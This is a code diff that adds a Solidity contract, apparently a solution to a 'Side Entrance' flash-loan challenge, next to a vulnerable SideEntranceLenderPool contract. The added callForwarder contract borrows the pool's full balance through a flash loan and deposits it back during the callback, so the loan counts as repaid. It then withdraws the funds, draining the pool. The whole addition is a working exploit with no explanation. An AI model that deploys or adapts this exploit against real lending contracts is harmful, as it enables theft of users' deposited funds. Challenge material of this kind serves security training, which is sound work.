@@ -45,3 +45,37 @@ contract SideEntranceLenderPool {
             revert RepayFailed();
     }
 }
+
+contract callForwarder is IFlashLoanEtherReceiver
+{
+    SideEntranceLenderPool obj;
+
+    constructor(address pool) 
+    {
+        obj = SideEntranceLenderPool(pool);
+        
+    }
+
+    function meow() public 
+    {
+        obj.flashLoan(address(obj).balance);
+    }
+
+    function deposit() public payable
+    {
+        obj.deposit{value : msg.value}();
+    }
+
+    function execute() external payable
+    {
+        obj.deposit{value:msg.value}();
+    }
+
+    function withdraw() public payable
+    {
+        obj.withdraw();
+        
+    }
+
+    receive() external payable {}
+}
